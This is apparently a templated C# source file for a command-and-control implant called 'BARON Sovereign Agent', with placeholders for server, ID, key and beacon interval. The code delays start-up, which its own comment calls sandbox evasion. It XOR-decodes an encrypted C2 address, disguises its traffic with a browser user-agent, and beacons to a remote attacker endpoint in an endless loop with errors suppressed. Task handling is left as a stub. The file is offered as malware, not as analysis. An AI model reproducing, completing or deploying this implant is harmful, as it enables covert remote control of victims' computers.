/* 
   BARON Sovereign Agent v5.0 — Sovereign Template
   Build Signature: {{ sig }}
   Generated: {{ build_time }}
*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace BaronProvider
{
    static class Program
    {
        static string _server = "{{ server }}";
        static string _id = "{{ id }}";
        static string _key = "{{ str_key_hex }}";
        static int _beacon = {{ beacon }};
        
        static void Main()
        {
            // Initial delay for sandbox evasion
            Thread.Sleep(2000);
            
            _server = Decrypt(_server);
            _id = Decrypt(_id);
            
            Run();
        }

        static void Run()
        {
            while(true)
            {
                try { Beacon(); } catch { }
                Thread.Sleep(_beacon + new Random().Next(1000));
            }
        }

        static void Beacon()
        {
            using (var client = new WebClient())
            {
                client.Headers["X-ID"] = _id;
                client.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/91.0";
                string url = Decrypt("{{ server }}") + "/api/agent/beacon";
                string resp = client.DownloadString(url);
                // Handle tasks here...
            }
        }

        static string Decrypt(string b64)
        {
            byte[] key = HexToBytes(_key);
            byte[] data = Convert.FromBase64String(b64);
            byte[] res = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                res[i] = (byte)(data[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(res);
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
    }
}
